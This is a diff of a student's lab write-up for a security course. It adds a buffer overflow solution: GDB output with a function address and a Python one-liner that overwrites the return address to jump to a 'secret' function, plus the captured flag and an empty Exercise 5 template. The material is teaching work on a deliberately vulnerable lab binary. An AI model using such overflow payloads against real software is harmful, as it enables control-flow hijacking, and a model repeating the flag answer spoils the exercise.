@@ -102,23 +102,37 @@ To exploit the program and obtain the secret, we target the buffer overflow vuln
 >
 >Then we just need to find the address of the `secret` through GDB.
 >```
-(gdb) print secret
-$1 = {void ()} 0x11fd \<secret>
+>(gdb) print secret
+$1 = {void ()} 0x565561fd \<secret>
 >```
 >Converting the address to little endian in hexadecimal and combining it all together, we get:
 >
 >```
->
+>student@hacklabvm:/home/q4$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"%01024d" + b"\xfd\x61\x55\x56")')
+>Jumping to function at 0x565561fd!!
+> _________________________________________
+>/ csf2024s1_{similarities-waftage-pockhou \
+>\ se}                                     /
+> -----------------------------------------
+>  \
+>   \
+>       __     
+>      UooU\.'@@@@@@`.
+>      \__/(@@@@@@@@@@)
+>           (@@@@@@@@)
+>           `YY~~~~YY'
+>            ||    ||
 >```
 
-
-
-
-
 <div style="page-break-after: always;"></div>
-
-
 ###### Exercise 5
+
+> [!exercise]+ Exercise 5
+> Go to /home/q5/. Exploit the program to get the secret.
+> 
+> **Answer:**
+
+
 
 <div style="page-break-after: always;"></div>
 
